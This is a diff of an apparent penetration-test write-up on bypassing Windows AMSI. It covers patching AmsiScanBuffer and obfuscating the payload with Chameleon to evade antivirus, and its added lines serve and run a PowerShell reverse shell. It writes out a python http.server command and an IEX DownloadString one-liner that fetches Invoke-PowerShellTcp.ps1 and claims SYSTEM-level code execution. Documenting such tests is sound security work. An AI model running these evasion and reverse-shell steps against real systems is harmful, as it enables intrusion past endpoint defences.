@@ -87,14 +87,16 @@ By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specif
 However, it is essential to acknowledge that even with the aforementioned payload, AMSI might still identify the content as malicious unless proper obfuscation methodologies are implemented. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
 string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.
 
-After proper obfuscation techniques were in place, the tester hosted a python web server on port 8443.
+After implementing effective obfuscation techniques, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
 ```bash
 python3 -m http.server 8443
 ```
 
-amsi area.
-
-## Weaponization
+Taking advantage of the AMSI.dll malfunction, the tester successfully initiated a reverse TCP connection via PowerShell, executing the following command in memory:
+```bash
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
+```
+Consequently, the tester achieved a  Remote Code Execution (RCE) with NT/Authority System privileges.
 
 ## Reference
--레드팀 플레이북 Read team playbook, Offensive Security
+[Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) && [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
